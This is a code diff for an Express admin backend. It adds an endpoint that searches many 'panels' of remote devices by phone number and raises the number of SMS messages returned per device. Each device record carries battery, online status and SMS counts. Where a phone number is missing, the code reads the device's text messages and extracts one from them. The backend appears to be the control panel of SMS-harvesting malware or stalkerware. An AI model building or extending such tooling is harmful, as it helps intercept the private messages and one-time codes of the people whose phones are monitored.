@@ -214,6 +214,78 @@ router.get("/panels/random-number", async (_req, res): Promise<void> => {
   });
 });
 
+router.get("/panels/search-number", async (req, res): Promise<void> => {
+  const query = String(req.query.q || "").trim().toLowerCase();
+  if (query.length < 3) {
+    res.status(400).json({ error: "Enter at least 3 characters to search" });
+    return;
+  }
+
+  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);
+  const perPanel = await Promise.allSettled(
+    panels.map(async (panel) => {
+      const devices = await fetchPanelDevicesForAdmin(panel);
+      const matches: Array<{
+        deviceId: string;
+        number: string | null;
+        deviceName: string;
+        panelId: number;
+        panelName: string;
+        status: string;
+        battery: string;
+        totalSms: number;
+        lastSeen: string | null;
+      }> = [];
+
+      for (const device of devices) {
+        let phoneNumber = device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : "";
+        let messages: FirebaseSmsMessage[] = [];
+        const baseHaystack = [
+          device.id,
+          device.name,
+          device.model,
+          phoneNumber,
+          panel.name,
+          String(panel.id),
+        ].join(" ").toLowerCase();
+
+        if (!baseHaystack.includes(query) && !phoneNumber) {
+          messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
+          phoneNumber = extractPhoneFromSms(messages) || "";
+        }
+
+        const haystack = [
+          baseHaystack,
+          phoneNumber,
+        ].join(" ").toLowerCase();
+
+        if (haystack.includes(query)) {
+          matches.push({
+            deviceId: device.id,
+            number: phoneNumber || null,
+            deviceName: device.name || device.model || device.id,
+            panelId: panel.id,
+            panelName: panel.name,
+            status: device.status ? "online" : "offline",
+            battery: device.battery || "—",
+            totalSms: device.totalSms,
+            lastSeen: device.lastSeen,
+          });
+        }
+
+        if (matches.length >= 20) break;
+      }
+
+      return matches;
+    }),
+  );
+
+  const matches = perPanel
+    .flatMap((result) => result.status === "fulfilled" ? result.value : [])
+    .slice(0, 50);
+  res.json({ query, total: matches.length, matches });
+});
+
 router.delete("/panels/:id", async (req, res): Promise<void> => {
   const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
   const params = DeletePanelParams.safeParse({ id: parseFloat(raw) });
@@ -279,7 +351,7 @@ router.get("/panels/:id/devices/:deviceId/sms", async (req, res): Promise<void> 
     panelName: panel.name,
     deviceId,
     total: messages.length,
-    messages: messages.slice(0, 50),
+    messages: messages.slice(0, 100),
   });
 });
 
